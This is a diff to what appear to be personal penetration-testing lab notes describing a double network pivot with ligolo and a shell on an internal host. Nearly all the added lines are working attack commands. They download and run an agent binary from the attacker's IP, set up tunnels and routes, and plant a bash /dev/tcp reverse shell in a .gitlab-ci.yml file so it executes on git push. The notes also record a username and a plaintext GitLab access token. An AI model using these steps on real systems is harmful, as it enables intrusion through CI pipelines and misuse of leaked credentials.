@@ -279,10 +279,38 @@ sudo ip netns exec foo /bin/bash
 # in research dir add shell command
 vi scratchpad/.gitlab-ci.yml
 
-# setup pivot to 14
-wget http://192.168.45.229/agent -o agent
-chmod +x agent
+# setup pivot to 14 - use this guide to double pivot https://4pfsec.com/ligolo
+# add listener on existing session
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11061 --tcp
 
+# download agent on the second machine
+wget http://192.168.45.229/agent -O agent
+chmod +x agent
+# connect to the first machine we proxied to from kali
+./agent -connect 192.168.229.221:11601 -ignore-cert
+
+# from kali
+session
+# switch to newly added session
+
+# add route to access
+sudo ip route add 10.20.119.0/24 dev ligolo
+
+# verify connectivity
+nmap 10.20.119.14 -p 80  
+
+# get shell on 14
+cd scratchpad
+nano .gitlab-ci.yml
+# add to one of the steps - will be executed on git push
+/bin/bash -l > /dev/tcp/192.168.45.229/7777 0<&1 2>&1
+git add .
+git commit -m 'update ci'
+git push origin main
+
+# creds for pushing to git
+root
+glpat-PzrxBe-5Js7c3t7hoq4X
 ```
 
 .11
